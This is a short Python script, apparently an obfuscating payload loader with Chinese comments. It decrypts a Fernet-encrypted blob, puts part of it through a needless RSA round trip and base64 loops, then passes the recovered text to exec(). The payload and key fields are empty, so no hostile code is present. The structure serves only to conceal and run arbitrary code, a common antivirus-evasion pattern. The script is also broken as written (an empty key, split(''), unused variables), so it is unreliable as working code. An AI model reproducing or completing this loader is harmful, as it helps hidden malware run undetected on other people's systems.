import base64
import time
import random
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
import ctypes


def base64_encode(original_message):
    random_int = random.randint(1, 10)
    ran_num = random.randint(1, 10)
    for i in range(1, random_int):
        load = str(base64.b64encode(original_message.encode('UTF-8')), 'UTF-8')

    return load, random_int

def base64_decode(msg,mn):
    for i in range(1,mn):
        load = base64.b64decode(msg)
    return load

# 生成私钥
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=608*15,
    backend=default_backend()
)

# 获取公钥
public_key = private_key.public_key()

def encrypt(message):
    encrypted = public_key.encrypt(
        plaintext=message.encode('utf-8'),
        padding=padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted

# 私钥解密
def decrypt(encrypted):
    original_message = private_key.decrypt(
        ciphertext=encrypted,
        padding=padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return original_message

pay=b''
key=b''
f1 = Fernet(key)
f2 = f1.decrypt(pay)
msg_list = f2.decode().split('')
msg1 = msg_list[0]
msg2 = msg_list[1]
msg = encrypt(msg2)
ori_msg_1 = decrypt(msg).decode('utf-8')
ori_msg = msg1+'\n'+decrypt(msg).decode('utf-8')
print(type(ori_msg))
load,ln = base64_encode(ori_msg)
load2 = base64_decode(load,ln)
print(ori_msg)
exec(ori_msg)
print('1')